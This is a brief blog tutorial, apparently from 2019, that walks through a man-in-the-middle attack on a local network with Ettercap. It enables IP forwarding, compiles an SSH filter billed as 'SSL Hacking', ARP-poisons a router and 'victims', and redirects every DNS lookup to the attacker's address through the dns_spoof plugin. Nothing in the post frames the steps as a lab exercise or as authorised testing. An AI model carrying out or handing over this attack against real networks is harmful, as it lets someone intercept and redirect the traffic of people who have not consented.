---
layout: post
title: Ettercap-ARP+DNS欺骗
subtitle: arp中间人
author: Kingtous
date: 2019-10-11 09:17:30
header-img: img/post-bg-unix-linux.jpg
catalog: True
tags:
- 计算机网络
typora-root-url: ../
---

> - Package :ettercap
> - System: Linux

### Step.1 enable net.ipv4.ip_forward

To allow system to accept network packages to pass through your computer.

`sudo sysctl -w net.ipv4.ip_forward=1`

### Step.2 compiile ssh.ef for SSL Connections

Enable SSL Hacking

```shell
cd /usr/share/ettercap
sudo etterfilter etter.filter.ssh -o ssh.ef
```

### Step.3 Open Ettercap with ssh.ef

```shell
sudo ettercap -G -F ssh.ef
```

![1570756980523](/img/unsorted/1570756980523.png)

**3.1** Select Interface

**3.2** Scan and add targets

> PS: Target1:Router Target2:victims

![1570757130076](/img/unsorted/1570757130076.png)

**3.3** ARP Poisoning

![1570757163708](/img/unsorted/1570757163708.png)

(Optional Part)

**3.4** enable DNS Proofing

> sudo vim /etc/ettercap/etter.conf
>
> \# clear all and add your `* A your_ip_address_you_want_to_redirect `

and load plugin `dns_spoof`

![1570757272310](/img/unsorted/1570757272310.png)

**3.5** All done.